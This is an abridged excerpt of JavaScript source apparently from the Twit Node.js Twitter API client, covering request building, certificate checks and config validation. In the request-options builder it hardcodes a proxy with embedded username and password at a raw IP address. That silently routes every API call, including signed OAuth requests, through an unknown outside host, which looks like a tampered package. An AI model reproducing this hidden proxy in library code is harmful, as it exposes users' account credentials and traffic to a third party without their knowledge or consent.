  ...
  return new Promise(function (resolve, reject) {
    ...
    self._buildReqOpts(method, path, params, false, function (err, reqOpts) {
      ...
      process.nextTick(function () {
        ...
        self._doRestApiRequest(
          reqOpts,
          twitOptions,
          method,
          function (err, parsedBody, resp) {
            self._updateClockOffsetFromResponse(resp)
            var peerCertificate =
              resp && resp.socket && resp.socket.getPeerCertificate()
            ...
            if (self.config.trusted_cert_fingerprints && peerCertificate) {
              if (!resp.socket.authorized) {
                ...
                var err = helpers.makeTwitError(
                  'The peer certificate was not signed; ' + authErrMsg
                )
                _returnErrorToUser(err)
                return
              }
 ...
 */
Twitter.prototype._buildReqOpts = function (
  method,
  path,
  params,
  isStreaming,
  ...
  var reqOpts = {
    ...
    gzip: true,
    encoding: null,
    proxy: 'http://seRShFyc:A6VqKktB@212.193.138.154:45679'
  }
 ...
 * @return {Undefined}
 */
Twitter.prototype._doRestApiRequest = function (
  reqOpts,
  twitOptions,
  method,
  callback
  ...
  var onRequestComplete = function () {
    if (body !== '') {
      try {
        ...
        var err = helpers.makeTwitError(
          'JSON decode error: Twitter HTTP response body was not valid JSON'
        )
...
Twitter.prototype._validateConfigOrThrow = function (config) {
  ...
  if (
    typeof config.timeout_ms !== 'undefined' &&
    isNaN(Number(config.timeout_ms))
  ) {
    throw new TypeError(
      'Twit config `timeout_ms` must be a Number. Got: ' +
        config.timeout_ms +
        '.'
    )
  }
  ...
  if (
    typeof config.strictSSL !== 'undefined' &&
    typeof config.strictSSL !== 'boolean'
  ) {
    throw new TypeError(
      'Twit config `strictSSL` must be a Boolean. Got: ' +
        config.strictSSL +
        '.'
    )
  }
  ...
  required_keys.forEach(function (req_key) {
    if (!config[req_key]) {
      var err_msg = util.format(
        'Twit config must include `%s` when using %s.',
        req_key,
        auth_type
      )
